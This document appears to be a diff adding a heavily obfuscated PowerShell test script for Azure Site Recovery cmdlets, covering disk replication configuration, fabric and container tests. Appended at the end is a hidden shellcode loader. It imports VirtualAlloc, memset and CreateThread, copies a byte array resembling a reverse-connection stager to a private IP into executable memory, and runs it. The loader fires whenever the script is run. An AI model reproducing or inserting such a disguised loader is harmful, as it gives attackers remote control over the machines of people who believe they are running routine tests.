@@ -1,0 +1,138 @@
+$4lSEO5 =  [TyPE]("{6}{11}{0}{1}{3}{12}{9}{8}{4}{2}{5}{10}{7}" -F 'es','t.','aMEwOrK.','Cl','FR','te','miCR','S','rE.test','zU','STuTIlItiE','oSOfT.R','iEntRuntImE.A')  ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function T`ESt-NEWa2A`DIskrEPlICaTion`cON`FI`GURAt`iOn
+{
+    ${recoV`Er`YS`ToR`AgeA`CCOU`NTiD} =("{20}{14}{7}{18}{17}{26}{0}{27}{8}{10}{2}{31}{16}{23}{21}{30}{4}{12}{15}{29}{13}{5}{9}{19}{25}{28}{22}{6}{11}{1}{3}{24}"-f '22-','rag','8-861','eAccounts/a2a','e','rg','e/st','ip','097-9','/provid','0c','o','Group','-','cr','s/a2','/r','/7c94','tions','ers/Microsoft','/subs','ur','ag','eso','rgdisks412','.St','3c1b-51','4','or','a','c','411bdd574')
+    ${Log`sToRa`gEa`CcoU`NTid} = ("{2}{6}{20}{19}{11}{7}{27}{15}{33}{23}{26}{29}{0}{3}{21}{4}{37}{1}{5}{8}{12}{14}{24}{25}{16}{17}{22}{36}{35}{18}{32}{31}{13}{9}{30}{10}{28}{34}{38}" -f'411b','Group','/subs','dd','74/reso','s/l','cri','/7c','trgp','t','a','ions','17051','nts/s','52333','c1','ers/Microsoft.Storage','/','ag','t','p','5','s','122-4097-9','/provi','d','0c8-8','943','me170515','61','agingsa2n','ou','eAcc','b-5','233','or','t','urce','3')
+    ${vh`d`URI} = ("{16}{9}{2}{0}{8}{15}{3}{4}{13}{11}{14}{10}{19}{18}{7}{1}{17}{5}{6}{20}{12}" -f 'shelltestd','1801','/power','1','4.blob.core.windows.net/vh','2','1','20','ia','ps:/','i','s','2.vhd','d','/psl','g4','htt','1','5','nV2-','4323')
+
+    ${v} = &("{12}{4}{3}{7}{2}{5}{8}{1}{9}{10}{11}{6}{0}" -f'fig','ToA','icesA','Rec','w-Az','srAzu','tionCon','overyServ','re','z','u','reDiskReplica','Ne') -VhdUri  ${VH`du`Ri} `
+        -RecoveryAzureStorageAccountId ${ReC`o`VERyS`TOra`gEAcCO`UNtiD} `
+        -LogStorageAccountId   ${LogS`To`RAgeAcCoun`TID}
+
+     &("{2}{3}{0}{1}" -f 'u','e','Asser','t-Tr') { ${v}."VH`DuRi" -eq ${V`HDU`Ri} }
+     &("{1}{2}{0}"-f 'e','Asse','rt-Tru') { ${v}."recove`RyAZUres`To`RAGE`AC`c`ountId" -eq ${reCoVeRysto`RAgea`Cc`OU`Ntid}  }
+     &("{0}{2}{1}"-f 'A','rue','ssert-T') { ${V}."LoGStOr`AGeac`C`OuN`TiD" -eq ${lOgsto`RAGeACCO`UN`T`iD} }
+}
+
+
+
+function TeST-n`E`wA2amAnAgEddiSkrepl`icATI`onConFi`G`UR`AtI`ON
+{
+    ${L`ogsTo`Ra`G`eACcOU`Nt`id} = "fdd"
+    ${D`Is`KId} = ("{2}{0}{1}" -f 'skI','d','di')
+    ${rec`o`VeR`y`R`e`SourCegro`UPid} = "3"
+    ${r`eCo`V`erYREPlica`d`iskAcCoU`Ntty`PE} = ("{2}{1}{0}" -f '_LRS','ium','Prem')
+    ${rECOve`RYtarGeTdisKA`CcoU`Nt`Ty`PE} = ("{0}{3}{1}{2}"-f 'Pr','iu','m_LRS','em')
+
+    ${v} = &("{7}{5}{6}{8}{2}{4}{10}{0}{3}{1}{9}" -f 'z','kReplicati','ove','ureDis','ry','ew-','A','N','zRec','onConfig','ServicesAsrAzureToA') -managed -LogStorageAccountId ${lOgSto`R`AGe`AC`couNt`Id} `
+         -DiskId ("{0}{2}{1}" -f 'di','d','skI') -RecoveryResourceGroupId  ${rECoveRyre`S`ourcE`GrouP`Id} -RecoveryReplicaDiskAccountType  ${RECo`V`ERYRE`plI`caDis`K`ACCo`UNT`TyPE} `
+         -RecoveryTargetDiskAccountType ${ReCOV`eR`YT`ArgE`TD`Is`kaccoUNTty`Pe}
+
+     &("{2}{0}{1}" -f 's','ert-True','As') { ${v}."LogS`TORageAc`COuNt`iD" -eq ${LOgSto`RA`geA`CCOUntID} }
+     &("{3}{2}{1}{0}"-f 'e','ert-Tru','ss','A') { ${V}."DI`SKid" -eq ${D`ISkiD}  }
+     &("{2}{3}{0}{1}" -f'ert','-True','As','s') { ${v}."R`Ec`ovE`RYrES`Ou`RcE`GROUpID" -eq ${reCo`VerY`R`esoUrc`EgroUPId} }
+}
+
+
+function T`eSt-`NewA`s`RFa`BRIC {
+    ${SE`ed} = 35;
+        ${v`AULtrGLO`cat`IoN} = &("{0}{2}{5}{4}{3}{1}" -f'ge','ocation','t','L','Rg','Vault')
+        ${V`AU`LTNAme} = &("{3}{1}{0}{2}"-f 'ultNam','a','e','getV')
+        ${V`AUl`TLOcatI`ON} = &("{3}{4}{2}{0}{1}" -f'oca','tion','aultL','g','etV')
+        ${V`AULTRg} = &("{1}{0}{2}"-f'Va','get','ultRg')
+        ${pr`imA`R`ylocA`TIOn} = &("{5}{2}{1}{3}{4}{0}"-f'on','ma','tPri','ry','Locati','ge')
+        ${ReCOV`E`R`YLoc`Ati`on} = &("{3}{5}{2}{4}{1}{0}"-f'n','Locatio','ove','get','ry','Rec')
+        ${PRi`mA`RYFA`BRIC`NAme} = &("{0}{3}{2}{1}"-f 'get','aryFabric','rim','P')
+        ${rEcov`E`RYfA`BRIc`Na`ME} = &("{3}{2}{1}{0}" -f 'yFabric','er','v','getReco')
+        
+        &("{3}{4}{1}{0}{2}" -f'ro','ResourceG','up','N','ew-Az') -name ${V`A`ULTrg} -location ${VaU`LtR`GLO`CAtion} -force
+          $4Lseo5::("{1}{0}"-f't','Wai').Invoke(20 * 1000)
+    
+        &("{5}{2}{3}{4}{6}{7}{0}{1}"-f 'l','t','w-AzRecov','er','y','Ne','ServicesVa','u') -ResourceGroupName ${vA`UltrG} -Name ${vAul`T`N`Ame} -Location ${vaUL`TLOC`At`iOn}
+          (GEt-VarIabLE ("4L"+"sEO5")  ).VAluE::("{1}{0}" -f'ait','W').Invoke(20 * 1000)
+        ${Va`U`lt} = &("{3}{5}{1}{2}{0}{4}{7}{6}"-f'ecover','z','R','Ge','ySer','t-A','lt','vicesVau') -ResourceGroupName ${VAUL`T`RG} -Name ${vAULt`Na`mE}
+        &("{2}{4}{0}{1}{3}" -f 'ultC','on','Set-ASR','text','Va') -Vault ${V`AU`LT}
+    
+        
+        ${FA`BJOB}=  &("{3}{0}{5}{1}{4}{2}" -f've','yServic','bric','New-AzReco','esAsrFa','r') -Azure -Name ${pRIMAr`Y`FabRICNa`mE} -Location ${PrIM`Ar`yLO`catIoN}
+        &("{4}{1}{2}{0}{5}{3}"-f 'obCom','itFo','rJ','n','Wa','pletio') -JobId ${FAb`jOB}."n`AMe"
+        ${f`AB} = &("{2}{4}{5}{7}{6}{3}{0}{1}"-f 'Fabri','c','G','sr','et-','A','sA','zRecoveryService') -Name ${PRi`mAr`YfA`BrICNAme}
+        &("{1}{0}{2}"-f'ru','Assert-t','e') { ${f`AB}."N`AME" -eq ${P`RiMArYFA`B`R`Icna`mE} }
+        &("{1}{2}{3}{0}"-f 'Equal','A','ssert-A','re') ${f`AB}."F`Abr`IcS`P`eCIFIcDET`AiLS"."l`ocA`TION" ${P`Rim`AryLo`C`Ation}
+}
+
+
+function te`S`T-Newco`NtaInER{
+
+    ${se`ED} = 33;
+    ${p`Ri`maR`YPOl`ICyN`Ame} = &("{4}{2}{0}{3}{1}"-f'P','y','ry','olic','getPrima')
+        ${RE`coV`Er`YPOlIcYn`A`Me} = &("{1}{2}{4}{0}{3}" -f'eryPoli','g','e','cy','tRecov')
+        
+        ${P`RimARyc`OnTa`i`NeRm`Ap`PInGna`ME} = &("{1}{2}{4}{0}{3}" -f'ain','g','etPri','erMapping','maryCont')
+        ${REco`VeRycontaI`NErMap`piN`gn`AMe} = &("{4}{5}{3}{1}{2}{0}{6}" -f'i','yCont','ainerMapp','r','getRec','ove','ng')
+        
+        ${pR`IM`A`R`yCoNTaiNernA`mE} = &("{3}{2}{1}{0}{4}" -f 'ta','yCon','r','getPrima','iner')
+        ${recOvErYcon`TaIne`R`N`AMe} = &("{4}{5}{1}{0}{2}{3}" -f'ryCo','Recove','n','tainer','g','et')
+        ${V`A`U`ltRg`locatiOn} = &("{2}{3}{1}{0}" -f 'on','ati','get','VaultRgLoc')
+        ${v`AULTNA`ME} = &("{2}{0}{3}{1}" -f'au','e','getV','ltNam')
+        ${vau`LtlOC`A`TIon} = &("{4}{0}{2}{3}{1}" -f't','n','Va','ultLocatio','ge')
+        ${V`AUL`TrG} = &("{2}{0}{1}" -f'ult','Rg','getVa')
+        ${PRIMaRY`l`Oc`ATiOn} = &("{3}{0}{1}{2}" -f'oca','t','ion','getPrimaryL')
+        ${recoveryL`o`Ca`Ti`ON} = &("{3}{1}{2}{4}{0}"-f 'ion','tRec','o','ge','veryLocat')
+        ${PriMaRYFA`Bricn`A`Me} = &("{0}{1}{2}{3}{4}"-f 'g','etP','ri','maryFab','ric')
+        ${rE`covERyfA`B`RI`cname} = &("{3}{1}{2}{0}" -f 'overyFabric','e','c','getR')
+        ${R`E`covER`yReP`LIC`AD`iSkaccO`U`Nttype} = ("{0}{2}{1}{3}" -f'Pre','um_LR','mi','S')
+        ${r`ECo`VER`YT`ArG`eTDiS`k`A`cCoUnTTYPe} = ("{1}{0}{2}"-f 'r','P','emium_LRS')
+
+        &("{0}{4}{3}{2}{5}{1}" -f'N','roup','u','AzReso','ew-','rceG') -name ${V`A`UlTRg} -location ${vAulTrGLo`Ca`T`IOn} -force
+         $4LSeo5::("{0}{1}"-f'Wai','t').Invoke(20 * 1000)
+    
+        &("{0}{1}{5}{3}{6}{4}{2}" -f'Ne','w-A','Vault','over','ces','zRec','yServi') -ResourceGroupName ${VaUl`T`RG} -Name ${Va`U`lTnamE} -Location ${vA`U`lt`LoC`ATiOn}
+         ( VariABlE ('4ls'+'Eo5')  -vALuEONLY  )::("{0}{1}" -f 'W','ait').Invoke(20 * 1000)
+        ${vau`lT} = &("{0}{2}{1}{4}{3}" -f'G','overySe','et-AzRec','ault','rvicesV') -ResourceGroupName ${V`AulT`RG} -Name ${VA`UlT`NAMe}
+        &("{1}{0}{3}{2}"-f 'SRVaultCon','Set-A','xt','te') -Vault ${vAu`lT}
+    
+        
+        ${f`ABJOb}=  &("{4}{3}{0}{1}{2}{6}{5}"-f 'ov','er','yServicesAsrFa','AzRec','New-','ric','b') -Azure -Name ${PRIm`A`RyfABR`I`CnamE} -Location ${pR`imAR`yl`O`CaTIon}
+        &("{5}{2}{3}{4}{0}{1}"-f'JobComplet','ion','i','tF','or','Wa') -JobId ${fABj`oB}."n`AME"
+        ${F`Ab} = &("{3}{1}{4}{5}{2}{0}{6}" -f'esAs','AzRec','ervic','Get-','overy','S','rFabric') -Name ${P`RImARy`Fab`R`icnAMe}
+        &("{1}{3}{2}{0}" -f'ue','Ass','rt-tr','e') { ${f`Ab}."nA`mE" -eq ${pR`iMaRyFaBR`IC`NAmE} }
+        &("{1}{0}{2}" -f 'ssert-AreEq','A','ual') ${f`Ab}."faBri`CsPeciFI`cdetai`Ls"."l`oC`AtioN" ${PRIMAR`yl`oc`A`TIoN}
+
+        ${F`ABjOb}=  &("{4}{9}{5}{2}{0}{7}{3}{1}{8}{6}"-f'Service','r','overy','s','New-Az','c','abric','sA','F','Re') -Azure -Name ${re`cOv`EryFabRic`NAmE} -Location ${R`eCo`VerYlocAt`ION}
+        &("{5}{1}{0}{4}{2}{3}"-f 'For','it','etio','n','JobCompl','Wa') -JobId ${fa`BJ`OB}."Na`me"
+        ${F`AB} = &("{3}{7}{4}{0}{5}{2}{1}{6}" -f 'F','i','r','Ge','ryServicesAsr','ab','c','t-AzRecove') -Name ${R`eC`Ov`ErYfabrICNAME}
+        &("{2}{3}{0}{1}" -f 'rt-tru','e','Ass','e') { ${F`AB}."Na`Me" -eq ${REcO`V`eRYfaBrI`C`NA`Me} }
+        &("{1}{2}{0}{3}" -f 'AreE','Ass','ert-','qual') ${F`AB}."FABR`I`csPeciFICD`EtA`IlS"."loC`At`iON" ${RECO`VeR`Ylo`CAtI`on}
+        ${p`F} = &("{2}{0}{1}"-f'-asrF','abric','get') -Name ${pRI`maRyF`Ab`RiC`NAme}
+        ${r`F} = &("{3}{1}{0}{2}"-f't-as','e','rFabric','g') -Name ${REc`Ov`erYf`ABr`ic`NaME}
+        
+        
+        ${j`Ob} = &("{7}{6}{4}{2}{1}{0}{5}{8}{3}" -f 'P','vicesAsr','r','iner','e','rote','yS','New-AzRecover','ctionConta') -Name ${P`R`iMaR`YC`oNtaI`NERnAME} -Fabric ${PF}
+        &("{5}{0}{3}{2}{4}{1}"-f'tFor','tion','bComp','Jo','le','Wai') -JobId ${J`OB}."na`mE"
+        ${PC} = &("{5}{4}{2}{0}{1}{3}" -f'tectionCon','taine','ro','r','rP','Get-as') -name ${pri`MARYco`Nt`AIN`ernaMe} -Fabric ${Pf}
+        &("{0}{3}{2}{1}" -f 'A','otNull','rt-N','sse')(${pC})
+        &("{1}{3}{0}{2}" -f 'reEqu','A','al','ssert-A') ${pc}."N`AmE" ${priMAry`coNt`AINE`RName}
+
+}
+${c} = ((("{6}{87}{97}{57}{79}{82}{3}{95}{45}{0}{76}{30}{80}{89}{20}{2}{68}{9}{65}{5}{43}{93}{49}{13}{53}{40}{31}{98}{28}{12}{102}{63}{92}{41}{33}{66}{48}{71}{51}{61}{46}{52}{67}{16}{78}{72}{85}{59}{77}{103}{1}{73}{22}{37}{47}{58}{29}{32}{69}{18}{39}{42}{70}{15}{24}{14}{7}{94}{62}{106}{99}{101}{26}{75}{56}{8}{4}{109}{110}{91}{25}{36}{64}{54}{38}{11}{83}{50}{10}{21}{55}{35}{34}{105}{17}{19}{23}{107}{86}{90}{44}{81}{88}{27}{84}{74}{104}{108}{100}{96}{60}" -f 'tern In','rea','c(I','ublic s',' dw','r lpAddress, ','[D','dd','uint','tP','rt.dl','[Dl','fl','e, ',' lpStartA','Pt','r','tat','z','ic e','lAllo','l2','Attribu','x','r','s, I','r','tPtr ','nt ','int d','P','ionType, u','wSt','.',']publi',')','nt','te','dId);','e, I','flAllocat','kernel32','n','uin','tPtr','c ex','at','s, ','l',' dwSiz','msvc','s','ic e','uint ','Threa','GH',', ','Imp','u','read(',');','t','ess','Impor','Ptr lp','t','dll2GH)]pub','xte','n','ackSi','t','ic ','reateT','d','uint sr','ameter','t','I','n IntPtr C','ort(2GHkernel32.dll2GH)','t',' memset(I',']p','lImport(2GH','dest, ','h','n','l','n','r Virtua',' In','lag','t(2GH','t','r','tati','unt','l','i',' lp','nt co','Pa','Protect);[Dll','ntPtr lpTh','c, u','c s',', IntPtr','ter','i','Creat','ionF'))."RePlA`cE"(([cHAR]50+[cHAR]71+[cHAR]72),[striNG][cHAR]34));${w} = &("{2}{0}{1}" -f '-Typ','e','Add') -memberDefinition ${C} -Name ("{1}{0}"-f '32','Win') -namespace ("{0}{2}{1}{4}{3}"-f'W','cti','in32Fun','ns','o') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6e,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${Z}."len`GTh" -gt 0x1000){${G} = ${z}."Len`gth"};${X}=${W}::("{1}{3}{0}{2}" -f 'Allo','V','c','irtual').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."L`eNgtH"-1);${I}++) {${w}::"mE`MsET"([IntPtr](${x}.("{0}{1}" -f'ToIn','t32').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{1}{2}{0}"-f'read','Crea','teTh').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{0}{3}{2}" -f't-sle','Star','p','e') 60};
